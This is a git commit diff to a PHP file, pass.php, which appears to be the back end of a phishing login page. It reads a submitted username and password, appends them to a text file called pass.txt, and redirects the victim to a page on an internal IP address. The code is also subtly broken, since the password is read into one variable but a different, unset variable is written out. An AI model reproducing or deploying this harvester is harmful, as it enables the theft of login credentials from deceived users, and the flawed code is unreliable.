a83a37f5fac9c331b99a5a80e2f53886c8f77727
sschatz1997 <s.schatz1997@gmail.com>
2018-09-04 10:35:02 -0400

    fix

--- pass.php
+++ pass.php
@@ -1,9 +1,13 @@
 <?php
-$username = $_POST['user'];
+
+$username = $_POST['username'];
 $email = $_POST['password'];
+
 $file = fopen("pass.txt", "a") or die ("file not open");
+
 $f = $username." , ".$password;
 fputs($file,$f) or die ("no data was written");
+
 fclose($file);
 header("Location: http://10.1.121.102/Redirect.html"); 
 exit();
